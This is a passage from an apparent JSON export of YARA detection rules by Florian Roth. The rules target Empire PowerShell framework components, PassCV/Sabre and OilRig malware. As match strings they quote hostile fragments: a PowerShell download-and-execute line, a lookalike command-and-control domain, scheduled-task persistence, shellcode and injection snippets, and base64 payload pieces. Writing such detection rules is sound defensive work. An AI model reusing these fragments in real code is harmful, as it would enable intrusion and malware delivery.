Invoke-DllInjection.ps1","minimum_yara":"1.7","name":"Empire_Invoke_DllInjection_RID315C","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"f108fb4a477ead407fe348cba725fc8e","score":75,"tags":["T1064","SCRIPT","DEMO","FILE","T1055","HKTL"]},{"author":"Florian Roth","content":"rule Empire_KeePassConfig_RID2ED4 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:31:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:31:11","description":"Detects Empire component - file KeePassConfig.ps1","minimum_yara":"1.7","name":"Empire_KeePassConfig_RID2ED4","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"44a7600026242ad544d18e5f49a81578","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_SSHCommand_RID304A : DEMO FILE SCRIPT T1021 T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-SSHCommand.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:33:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1021, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA\" ascii\n      $s2 = \"Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \\\"id\\\"\" fullword ascii\n      $s3 = \"Write-Verbose \\\"[*] Error loading dll\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x660a and filesize < 2000KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:33:31","description":"Detects Empire component - file Invoke-SSHCommand.ps1","minimum_yara":"1.7","name":"Empire_Invoke_SSHCommand_RID304A","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"d9e2e6b3d8b64db9c17d3cc60e5a0477","score":75,"tags":["DEMO","T1064","SCRIPT","FILE","T1021"]},{"author":"Florian Roth","content":"rule Empire_PowerUp_Gen_RID2E1D : DEMO FILE GEN SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - from files PowerUp.ps1, PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath\" fullword ascii\n      $s2 = \"$Result = sc.exe pause $($TargetService.Name)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:00:41","description":"Detects Empire component - from files PowerUp.ps1, PowerUp.ps1","minimum_yara":"1.7","name":"Empire_PowerUp_Gen_RID2E1D","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"aad5425b0b6ae494d8b5ee30eb1cfada","score":75,"tags":["GEN","DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Agent_Gen_RID2D3A : DEMO FILE GEN SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - from files agent.ps1, agent.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 10:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$wc.Headers.Add(\\\"User-Agent\\\",$script:UserAgent)\" fullword ascii\n      $s2 = \"$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)\" fullword ascii\n      $s3 = \"if ($script:AgentDelay -ne 0){\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x660a and filesize < 100KB and 1 of them ) or all of them\n}","date":"2016-11-05 10:22:51","description":"Detects Empire component - from files agent.ps1, agent.ps1","minimum_yara":"1.7","name":"Empire_Agent_Gen_RID2D3A","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"6a64c71600326b1464ea33dbde73d751","score":75,"tags":["GEN","DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_InveighRelay_Gen_RID32DD : DEMO FILE GEN SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$inveigh.SMBRelay_failed_list.Add(\\\"$HTTP_NTLM_domain_string\\\\$HTTP_NTLM_user_string $SMBRelayTarget\\\")\" fullword ascii\n      $s2 = \"$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of them ) or all of them\n}","date":"2016-11-05 14:23:21","description":"Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1","minimum_yara":"1.7","name":"Empire_Invoke_InveighRelay_Gen_RID32DD","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"131e679e53548de96c292de22359297b","score":75,"tags":["GEN","DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_KeePassConfig_Gen_RID304D : DEMO FILE GEN SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:34:01","description":"Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1","minimum_yara":"1.7","name":"Empire_KeePassConfig_Gen_RID304D","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"e14e3424e95f68ec98d0885315fa3800","score":75,"tags":["GEN","DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_Portscan_Gen_RID3160 : DEMO FILE GEN SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Test-Port -h $h -p $Port -timeout $Timeout\" fullword ascii\n      $s2 = \"1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 100KB and 1 of them ) or all of them\n}","date":"2016-11-05 13:19:51","description":"Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1","minimum_yara":"1.7","name":"Empire_Invoke_Portscan_Gen_RID3160","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"c379621c0d96792eb56aa47627f53b04","score":75,"tags":["GEN","DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_Gen_RID2DB7 : DEMO FILE GEN HKTL SCRIPT T1055 T1064 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 10:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, HKTL, SCRIPT, T1055, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Shellcode1 += 0x48\" fullword ascii\n      $s2 = \"$PEHandle = [IntPtr]::Zero\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them\n}","date":"2016-11-05 10:43:41","description":"Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1","minimum_yara":"1.7","name":"Empire_Invoke_Gen_RID2DB7","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"6781b86147aadec0c02a9039bbf2991d","score":75,"tags":["T1064","SCRIPT","DEMO","FILE","T1055","GEN","HKTL"]},{"author":"Florian Roth","content":"rule Empire_PowerShell_Framework_Gen5_RID3392 : DEMO FILE HKTL SCRIPT T1003 T1055 T1064 T1086 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1003, T1055, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if ($ExeArgs -ne $null -and $ExeArgs -ne '')\" fullword ascii\n      $s2 = \"$ExeArgs = \\\"ReflectiveExe $ExeArgs\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them\n}","date":"2016-11-05 14:53:31","description":"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1","minimum_yara":"1.7","name":"Empire_PowerShell_Framework_Gen5_RID3392","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"151d6468b086f58766c1c23cbd393f53","score":75,"tags":["T1064","SCRIPT","DEMO","T1086","FILE","T1003","T1055","HKTL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_1_RID2F45 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\Excalibur\\\\\" ascii\n      $x2 = \"bin\\\\oSaberSvc.pdb\" ascii\n      $s1 = \"cmd.exe /c MD \" fullword ascii\n      $s2 = \"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baidu&wd=ip138\" fullword wide\n      $s3 = \"CloudRun.exe\" fullword wide\n      $s4 = \"SaberSvcB.exe\" fullword wide\n      $s5 = \"SaberSvc.exe\" fullword wide\n      $s6 = \"SaberSvcW.exe\" fullword wide\n      $s7 = \"tianshiyed@iaomaomark1#23mark123tokenmarkqwebjiuga664115\" fullword wide\n      $s8 = \"Internet Connect Failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) and 5 of ( $s* ) ) ) or ( all of them )\n}","date":"2016-10-20 11:50:01","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_1_RID2F45","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"daad0a2ca7c65bc2f8393045ac33b953","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_Signing_Cert_RID33D0 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 15:03:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WOODTALE TECHNOLOGY INC\" ascii\n      $s2 = \"Flyingbird Technology Limited\" ascii\n      $s3 = \"Neoact Co., Ltd.\" ascii\n      $s4 = \"AmazGame Age Internet Technology Co., Ltd\" ascii\n      $s5 = \"EMG Technology Limited\" ascii\n      $s6 = \"Zemi Interactive Co., Ltd\" ascii\n      $s7 = \"337 Technology Limited\" ascii\n      $s8 = \"Runewaker Entertainment0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )\n}","date":"2016-10-20 15:03:51","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_Signing_Cert_RID33D0","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"9b3e1da1d13ae77c2377533069d006f2","score":50,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_2_RID2F46 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ncProxyXll\" fullword ascii\n      $s1 = \"Uniscribe.dll\" fullword ascii\n      $s2 = \"WS2_32.dll\" ascii\n      $s3 = \"ProxyDll\" fullword ascii\n      $s4 = \"JDNSAPI.dll\" fullword ascii\n      $s5 = \"x64.dat\" fullword ascii\n      $s6 = \"LSpyb2\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and $x1 ) or ( all of them )\n}","date":"2016-10-20 11:50:11","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_2_RID2F46","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"7e21a6349a5874e448ffc2d43c5f19db","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_Excalibur_1_RID3343 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 14:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\\" ascii\n      $x2 = \"Excalibur\\\\bin\\\\Shell.pdb\" ascii\n      $x3 = \"SaberSvc.exe\" wide\n      $s1 = \"BBB.exe\" fullword wide\n      $s2 = \"AAA.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of ( $x* ) or all of ( $s* ) ) or 3 of them\n}","date":"2016-10-20 14:40:21","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_Excalibur_1_RID3343","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"112ec4a29c607785bb7b5c1405b58a36","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_3_RID2F47 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NXKILL\" fullword wide\n      $s1 = \"2OLE32.DLL\" fullword ascii\n      $s2 = \"localspn.dll\" fullword wide\n      $s3 = \"!This is a Win32 program.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and $x1 and 2 of ( $s* ) )\n}","date":"2016-10-20 11:50:21","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_3_RID2F47","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"ebb54c36a25bc08a558985ae076bbcff","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_4_RID2F48 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"QWNjZXB0On\" fullword ascii\n      $s2 = \"VXNlci1BZ2VudDogT\" fullword ascii\n      $s3 = \"dGFzay5kbnME3luLmN\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2016-10-20 11:50:31","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_4_RID2F48","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"143ff0a4c3219e375a7bb765cfddfec5","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Tool_NTScan_RID3010 : APT DEMO EXE FILE MAL T1077 {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 12:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1077\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NTscan.EXE\" fullword wide\n      $x2 = \"NTscan Microsoft \" fullword wide\n      $s1 = \"admin$\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )\n}","date":"2016-10-20 12:23:51","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Tool_NTScan_RID3010","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"496b560f312841437b30fb3896d731c7","score":75,"tags":["T1077","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule PassCV_Sabre_Malware_5_RID2F49 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20 11:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ncircTMPg\" fullword ascii\n      $x2 = \"~SHELL#\" fullword ascii\n      $x3 = \"N.adobe.xm\" fullword ascii\n      $s1 = \"NEL32.DLL\" fullword ascii\n      $s2 = \"BitLocker.exe\" fullword wide\n      $s3 = \"|xtplhd\" fullword ascii\n      $s4 = \"SERVICECORE\" fullword wide\n      $s5 = \"SHARECONTROL\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) or all of ( $s* ) )\n}","date":"2016-10-20 11:50:41","description":"PassCV Malware mentioned in Cylance Report","minimum_yara":"1.7","name":"PassCV_Sabre_Malware_5_RID2F49","reference":"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies","required_modules":[],"rule_hash":"07ac6a98fad12349f0c104d6cafdde63","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Campaign_Gen1_RID31A8 : DEMO FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 13:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace\" ascii\n      $x2 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {waitfor haha /T 2}\\\" & Chr(34), 0\" fullword ascii\n      $x3 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n      $s4 = \"CreateObject(\\\"WScript.Shell\\\").Run cmd, 0o\" fullword ascii\n      $b1 = \"JGdsb2JhbDpteWhvc3QgP\" ascii\n      $b2 = \"SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX\" ascii\n      $b3 = \"U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV\" ascii\n      $b4 = \"JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA\" ascii\n      $b5 = \"DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN\" ascii\n      $b6 = \"d2hvYW1pICYgaG9zdG5hb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 700KB and 1 of them )\n}","date":"2016-10-12 13:31:51","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Malware_Campaign_Gen1_RID31A8","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"788971385547af133d4d96ca27960542","score":75,"tags":["DEMO","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Campaign_Mal1_RID31A8 : DEMO FILE MAL MIDDLE_EAST T1105 {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 13:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DownloadExecute=\\\"powershell \\\"\\\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(\" ascii\n      $x2 = \"-ExecutionPolicy Bypass -File \\\"&HOME&\\\"dns.ps1\\\"\" fullword ascii\n      $x3 = \"CreateObject(\\\"WScript.Shell\\\").Run Replace(DownloadExecute,\\\"-_\\\",\\\"bat\\\")\" fullword ascii\n      $x4 = \"CreateObject(\\\"WScript.Shell\\\").Run DnsCmd,0\" fullword ascii\n      $s1 = \"http://winodwsupdates.me\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4f48 and filesize < 4KB and 1 of them ) or ( 2 of them )\n}","date":"2016-10-12 13:31:51","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Malware_Campaign_Mal1_RID31A8","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"372845575cc930b00047895bb84b63b1","score":75,"tags":["DEMO","T1105","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Campaign_Gen2_RID31A9 : DEMO FILE MAL MIDDLE_EAST T1053 {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 13:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%userprofile%\\\\AppData\\\\Local\\\\Microsoft\\\\ \" fullword ascii\n      $s2 = \"$fdn=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('\" fullword ascii\n      $s3 = \"&{$rn = Get-Random; $id = 'TR\" fullword ascii\n      $s4 = \"') -replace '__',('DNS'+$id) | \" fullword ascii\n      $s5 = \"\\\\upd.vbs\" fullword ascii\n      $s6 = \"schtasks /create /F /sc minute /mo \" fullword ascii\n      $s7 = \"') -replace '__',('HTP'+$id) | \" fullword ascii\n      $s8 = \"&{$rn = Get-Random -minimum 1 -maximum 10000; $id = 'AZ\" fullword ascii\n      $s9 = \"http://www.israirairlines.com/?mode=page&page=14635&lang=eng<\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 4000KB and 2 of ( $s* ) ) or ( 4 of them )\n}","date":"2016-10-12 13:32:01","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Malware_Campaign_Gen2_RID31A9","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"c7f9296f17a6a0430cb8241710d087be","score":75,"tags":["DEMO","MIDDLE_EAST","T1053","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Campaign_Gen3_RID31AA : DEMO FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 13:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr\" fullword ascii\n      $x2 = \"\\\\Libraries\\\\fireueye.vbs\" fullword ascii\n      $x3 = \"\\\\Libraries\\\\fireeye.vbs&\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and 1 of them )\n}","date":"2016-10-12 13:32:11","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Malware_Campaign_Gen3_RID31AA","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"4bc22b3706ea97d9c7595593992d42ca","score":75,"tags":["DEMO","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Campaign_Mal2_RID31A9 : DEMO FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 13:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC 